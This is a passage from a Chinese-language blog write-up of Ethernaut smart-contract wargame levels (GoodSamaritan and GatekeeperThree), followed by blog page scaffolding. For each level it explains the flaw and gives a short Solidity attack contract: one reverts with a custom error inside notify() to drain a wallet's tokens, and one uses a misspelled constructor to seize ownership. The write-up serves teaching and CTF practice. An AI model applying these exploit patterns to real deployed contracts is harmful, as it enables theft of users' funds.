        &#125;
        _;
    &#125;

    constructor() &#123;
        owner = msg.sender;
    &#125;

    function donate10(address dest_) external onlyOwner &#123;
        // check balance left
        if (coin.balances(address(this)) &lt; 10) &#123;
            revert NotEnoughBalance();
        &#125; else &#123;
            // donate 10 coins
            coin.transfer(dest_, 10);
        &#125;
    &#125;

    function transferRemainder(address dest_) external onlyOwner &#123;
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    &#125;

    function setCoin(Coin coin_) external onlyOwner &#123;
        coin = coin_;
    &#125;
&#125;

interface INotifyable &#123;
    function notify(uint256 amount) external;
&#125;
</code></pre><p>我们要夺走所有代币  调用wallet的donate10如果合约代币余额不够 就会抛出NotEnoughBalance() 然后catch到这个error就会把合约里剩余的代币余额发给你<br>可以看到正常donate10之后的transfer 会触发合约接受者的notify函数 那我们可以在notify函数中抛出NotEnoughBalance()的错误  这样就会把钱都发给合约接收者  </p>
<pre><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface smart&#123;
    function requestDonation() external;
&#125;
contract Attack&#123;
    address target;
    error NotEnoughBalance();
    constructor(address _target) public payable&#123;
        target = _target;
    &#125;
    function attack() public&#123;
        smart(target).requestDonation();
    &#125;
    function notify(uint256 amount) external&#123;
        revert NotEnoughBalance();
    &#125;

&#125;
</code></pre><p>调用attack就可以  </p>
<h2 id="GatekeeperThree"><a href="#GatekeeperThree" class="headerlink" title="GatekeeperThree"></a>GatekeeperThree</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p>
<pre><code>contract SimpleTrick &#123;
GatekeeperThree public target;
address public trick;
uint private password = block.timestamp;

constructor (address payable _target) &#123;
    target = GatekeeperThree(_target);
&#125;

function checkPassword(uint _password) public returns (bool) &#123;
    if (_password == password) &#123;
    return true;
    &#125;
    password = block.timestamp;
    return false;
&#125;

function trickInit() public &#123;
    trick = address(this);
&#125;

function trickyTrick() public &#123;
    if (address(this) == msg.sender &amp;&amp; address(this) != trick) &#123;
    target.getAllowance(password);
    &#125;
&#125;
&#125;

contract GatekeeperThree &#123;
address public owner;
address public entrant;
bool public allow_enterance = false;
SimpleTrick public trick;

function construct0r() public &#123;
    owner = msg.sender;
&#125;

modifier gateOne() &#123;
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
&#125;

modifier gateTwo() &#123;
    require(allow_enterance == true);
    _;
&#125;

modifier gateThree() &#123;
    if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) == false) &#123;
    _;
    &#125;
&#125;

function getAllowance(uint _password) public &#123;
    if (trick.checkPassword(_password)) &#123;
        allow_enterance = true;
    &#125;
&#125;

function createTrick() public &#123;
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
&#125;

function enter() public gateOne gateTwo gateThree returns (bool entered) &#123;
    entrant = tx.origin;
    return true;
&#125;

receive () external payable &#123;&#125;
&#125;
</code></pre><p>要通过三个修饰符 第一个需要合约调用 并且调用合约为owner<br>这个很好通过 因为constructor写错了 所以我们可以用攻击合约调用constructOr 成为owner<br>第二个修饰符要通过getAllowance（）完成  先createTrick（）  然后通过web3查到password<br>调用getAllowance（）就可以完成<br>第三个修饰符 让攻击合约没有receive或者fallback函数 然后给gatekeeper3转0.001以上的ether就可以完成<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;<br>    interface gate{<br>        function construct0r() external;<br>        function enter() external;<br>    }<br>    contract attack{<br>        address target;<br>        constructor(address _target) public{<br>            target = _target;<br>        }</p>
<pre><code>    function Attack() public&#123;
        gate(target).construct0r();
        gate(target).enter();
    &#125;
&#125;  
</code></pre><p>调用attack就行</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">lsq</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/10/10/ethernaut/">http://example.com/2023/10/10/ethernaut/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%A0%87%E7%AD%BE1/">标签1</a></div><div class="post_share"><div class="social-share" data-image="https://img0.baidu.com/it/u=3431118657,348133440&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=281" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/10/10/funstr/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2F2018-10-26%2F5bd2cf1873f75.jpg&amp;refer=http%3A%2F%2Fpic1.win4000.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=auto?sec=1672059133&amp;t=52c973f7c56ace492c2a4e392b7595a3" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">函数体任意转跳漏洞</div></div></a></div><div class="next-post pull-right"><a href="/2023/10/10/lowInformation/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.alicdn.com%2Fi1%2F3159590468%2FO1CN01POiQ7C1FKNysIsN6R_%21%213159590468.jpg&amp;refer=http%3A%2F%2Fimg.alicdn.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=auto?sec=1672058965&amp;t=d7380115aef9b394d6c2baf4dee63799" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">LowInformation</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2022/11/26/Argument-Encoding/" title="argument encoding"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fnewyx-img.hellonitrack.com%2Fnewspic%2Fimage%2F201604%2F19%2Fedb692c68a.jpg&refer=http%3A%2F%2Fnewyx-img.hellonitrack.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1672058872&t=cc2d3a13d9ca1a3aeba531f44bb0c695" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-26</div><div class="title">argument encoding</div></div></a></div><div><a href="/2023/07/14/ERC/" title="ERC系列合约学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img0.baidu.com/it/u=471504868,3486654871&fm=253&fmt=auto&app=138&f=JPEG?w=889&h=500" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-14</div><div class="title">ERC系列合约学习</div></div></a></div><div><a href="/2023/02/25/Damn-valurable-defi-sotion/" title="Damn vaulnerable Defi 题解"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2F2020-07-22%2F5f17fe80ceaae.jpg&refer=http%3A%2F%2Fpic1.win4000.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1672059006&t=740baec47daa0a9f466c4033a1cc4e92" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-25</div><div class="title">Damn vaulnerable Defi 题解</div></div></a></div><div><a href="/2023/12/10/UniswapV3%E5%AD%A6%E4%B9%A0/" title="UniswapV3 - 原理"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2F2020-07-22%2F5f17fe80ceaae.jpg&refer=http%3A%2F%2Fpic1.win4000.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1672059006&t=740baec47daa0a9f466c4033a1cc4e92" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-10</div><div class="title">UniswapV3 - 原理</div></div></a></div><div><a href="/2023/05/29/chainflagctf/" title="chainflagctf"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2F2018-10-26%2F5bd2cf1873f75.jpg&refer=http%3A%2F%2Fpic1.win4000.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1672059133&t=52c973f7c56ace492c2a4e392b7595a3" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-29</div><div class="title">chainflagctf</div></div></a></div><div><a href="/2022/11/26/crypto/" title="Steal Crypto"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fnewyx-img.hellonitrack.com%2Fnewspic%2Fimage%2F201604%2F19%2Fedb692c68a.jpg&refer=http%3A%2F%2Fnewyx-img.hellonitrack.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1672058872&t=cc2d3a13d9ca1a3aeba531f44bb0c695" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-26</div><div class="title">Steal Crypto</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img0.baidu.com/it/u=1478036750,1488409170&amp;fm=253&amp;fmt=auto&amp;app=120&amp;f=JPEG?w=800&amp;h=500" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lsq</div><div class="author-info__description">lsq</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/shaflow01"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/shaflow01" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/shaflow01@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">欢迎来到我的博客！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ethernaut"><span class="toc-text">ethernaut</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fallback"><span class="toc-text">Fallback</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FallOut"><span class="toc-text">FallOut</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CoinFlip"><span class="toc-text">CoinFlip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Telephone"><span class="toc-text">Telephone</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Token"><span class="toc-text">Token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#delegatecall"><span class="toc-text">delegatecall</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Force"><span class="toc-text">Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vault"><span class="toc-text">vault</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reentrance"><span class="toc-text">Reentrance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Elevator"><span class="toc-text">Elevator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privacy"><span class="toc-text">Privacy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gateKeeperOne"><span class="toc-text">gateKeeperOne</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gatekeepertwo"><span class="toc-text">gatekeepertwo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NaughtCoin"><span class="toc-text">NaughtCoin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Preservation"><span class="toc-text">Preservation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recovery"><span class="toc-text">Recovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AlienCodex"><span class="toc-text">AlienCodex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Denial"><span class="toc-text">Denial</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shop"><span class="toc-text">shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dex"><span class="toc-text">Dex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dex2"><span class="toc-text">dex2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Motorbike"><span class="toc-text">Motorbike</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DoubleEntryPoint"><span class="toc-text">DoubleEntryPoint</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GoodSamaritan"><span class="toc-text">GoodSamaritan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GatekeeperThree"><span class="toc-text">GatekeeperThree</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By lsq</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script defer src="/js/light.js"></script><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="30" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_clock_anzhiyu_injector_config(){
    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
    console.log('已挂载butterfly_clock_anzhiyu')
    if(parent_div_git) {
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = '/';
  var qweather_key = 'b16a1fa0e63c46a4b8f28abfb06ae3fe';
  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
  var baidu_ak_key = 'undefined';
  var flag = 0;
  var clock_rectangle = '113.34532,23.15624';
  var clock_default_rectangle_enable = 'false';

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_clock_anzhiyu_injector_config();
  }
  else if (epage === cpage){
    butterfly_clock_anzhiyu_injector_config();
  }
  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><script data-pjax>
  function butterfly_footer_beautify_injector_config(){
    var parent_div_git = document.getElementById('footer-wrap');
    var item_html = '<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v6.2.0" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v4.3.1" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" data-title="本站采用多线部署，主线路托管于Vercel" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-Vercel-brightgreen?style=flat&amp;logo=Vercel" alt=""/></a><a class="github-badge" target="_blank" href="https://dashboard.4everland.org/" style="margin-inline:5px" data-title="本站采用多线部署，备用线路托管于4EVERLAND" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-4EVERLAND-22DDDD?style=flat&amp;logo=IPFS" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a></p>';
    console.log('已挂载butterfly_footer_beautify')
    parent_div_git.insertAdjacentHTML("beforeend",item_html)
    }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_footer_beautify_injector_config();
  }
  else if (epage === cpage){
    butterfly_footer_beautify_injector_config();
  }
  </script><script async src="https://www.fomal.cc/static/js/runtime.js"></script><script data-pjax>
  function butterfly_swiper_injector_config(){
    var parent_div_git = document.getElementById('recent-posts');
    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
    console.log('已挂载butterfly_swiper')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'undefined'.split(',');
  var cpage = location.pathname;
  var epage = '/';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_swiper_injector_config();
  }
  else if (epage === cpage){
    butterfly_swiper_injector_config();
  }
  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '2s');
    arr[i].setAttribute('data-wow-delay', '1s');
    arr[i].setAttribute('data-wow-offset', '100');
    arr[i].setAttribute('data-wow-iteration', '2');
  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><script data-pjax src="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.js"></script><script data-pjax>
  function gitcalendar_injector_config(){
      var parent_div_git = document.getElementById('gitZone');
      var item_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><style>#git_container{min-height: 280px}@media screen and (max-width:650px) {#git_container{min-height: 0px}}</style><div id="git_loading" style="width:10%;height:100%;margin:0 auto;display: block;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animatetransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animatetransform></path></svg><style>#git_container{display: none;}</style></div><div id="git_container"></div></div>';
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
      console.log('已挂载gitcalendar')
      }

    if( document.getElementById('gitZone') && (location.pathname ==='/about/'|| '/about/' ==='all')){
        gitcalendar_injector_config()
        GitCalendarInit("https://gitcalendar.fomal.cc/api?shaflow01",['#d9e0df', '#c6e0dc', '#a8dcd4', '#9adcd2', '#89ded1', '#77e0d0', '#5fdecb', '#47dcc6', '#39dcc3', '#1fdabe', '#00dab9'],'shaflow01')
    }
  </script><!-- hexo injector body_end end --></body></html>